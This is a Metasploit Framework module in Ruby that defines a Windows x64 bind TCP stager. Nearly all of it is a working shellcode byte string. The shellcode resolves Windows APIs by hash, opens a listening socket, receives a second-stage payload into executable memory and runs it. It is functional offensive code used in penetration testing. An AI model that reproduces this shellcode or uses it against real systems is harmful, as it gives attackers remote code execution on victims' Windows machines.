##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/bind_tcp'


module Metasploit3

  CachedSize = 467

  include Msf::Payload::Stager
  include Msf::Payload::Windows

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Windows x64 Bind TCP Stager',
      'Description'   => 'Listen for a connection (Windows x64)',
      'Author'        => [ 'sf' ],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86_64,
      'Handler'       => Msf::Handler::BindTcp,
      'Convention'    => 'sockrdi',
      'Stager'        =>
        {
          'Offsets' =>
            {
              'LPORT' => [ 232, 'n' ]
            },
          'RequiresMidstager' => false,
          'Payload' =>
            "\xFC\x48\x83\xE4\xF0\xE8\xC0\x00\x00\x00\x41\x51\x41\x50\x52\x51" +
            "\x56\x48\x31\xD2\x65\x48\x8B\x52\x60\x48\x8B\x52\x18\x48\x8B\x52" +
            "\x20\x48\x8B\x72\x50\x48\x0F\xB7\x4A\x4A\x4D\x31\xC9\x48\x31\xC0" +
            "\xAC\x3C\x61\x7C\x02\x2C\x20\x41\xC1\xC9\x0D\x41\x01\xC1\xE2\xED" +
            "\x52\x41\x51\x48\x8B\x52\x20\x8B\x42\x3C\x48\x01\xD0\x8B\x80\x88" +
            "\x00\x00\x00\x48\x85\xC0\x74\x67\x48\x01\xD0\x50\x8B\x48\x18\x44" +
            "\x8B\x40\x20\x49\x01\xD0\xE3\x56\x48\xFF\xC9\x41\x8B\x34\x88\x48" +
            "\x01\xD6\x4D\x31\xC9\x48\x31\xC0\xAC\x41\xC1\xC9\x0D\x41\x01\xC1" +
            "\x38\xE0\x75\xF1\x4C\x03\x4C\x24\x08\x45\x39\xD1\x75\xD8\x58\x44" +
            "\x8B\x40\x24\x49\x01\xD0\x66\x41\x8B\x0C\x48\x44\x8B\x40\x1C\x49" +
            "\x01\xD0\x41\x8B\x04\x88\x48\x01\xD0\x41\x58\x41\x58\x5E\x59\x5A" +
            "\x41\x58\x41\x59\x41\x5A\x48\x83\xEC\x20\x41\x52\xFF\xE0\x58\x41" +
            "\x59\x5A\x48\x8B\x12\xE9\x57\xFF\xFF\xFF\x5D\x49\xBE\x77\x73\x32" +
            "\x5F\x33\x32\x00\x00\x41\x56\x49\x89\xE6\x48\x81\xEC\xA0\x01\x00" +
            "\x00\x49\x89\xE5\x49\xBC\x02\x00\x11\x5C\x00\x00\x00\x00\x41\x54" +
            "\x49\x89\xE4\x4C\x89\xF1\x41\xBA\x4C\x77\x26\x07\xFF\xD5\x4C\x89" +
            "\xEA\x68\x01\x01\x00\x00\x59\x41\xBA\x29\x80\x6B\x00\xFF\xD5\x50" +
            "\x50\x4D\x31\xC9\x4D\x31\xC0\x48\xFF\xC0\x48\x89\xC2\x48\xFF\xC0" +
            "\x48\x89\xC1\x41\xBA\xEA\x0F\xDF\xE0\xFF\xD5\x48\x89\xC7\x6A\x10" +
            "\x41\x58\x4C\x89\xE2\x48\x89\xF9\x41\xBA\xC2\xDB\x37\x67\xFF\xD5" +
            "\x48\x31\xD2\x48\x89\xF9\x41\xBA\xB7\xE9\x38\xFF\xFF\xD5\x4D\x31" +
            "\xC0\x48\x31\xD2\x48\x89\xF9\x41\xBA\x74\xEC\x3B\xE1\xFF\xD5\x48" +
            "\x89\xF9\x48\x89\xC7\x41\xBA\x75\x6E\x4D\x61\xFF\xD5\x48\x81\xC4" +
            "\xA0\x02\x00\x00\x48\x83\xEC\x10\x48\x89\xE2\x4D\x31\xC9\x6A\x04" +
            "\x41\x58\x48\x89\xF9\x41\xBA\x02\xD9\xC8\x5F\xFF\xD5\x48\x83\xC4" +
            "\x20\x5E\x6A\x40\x41\x59\x68\x00\x10\x00\x00\x41\x58\x48\x89\xF2" +
            "\x48\x31\xC9\x41\xBA\x58\xA4\x53\xE5\xFF\xD5\x48\x89\xC3\x49\x89" +
            "\xC7\x4D\x31\xC9\x49\x89\xF0\x48\x89\xDA\x48\x89\xF9\x41\xBA\x02" +
            "\xD9\xC8\x5F\xFF\xD5\x48\x01\xC3\x48\x29\xC6\x48\x85\xF6\x75\xE1" +
            "\x41\xFF\xE7"
        }
      ))
  end

end
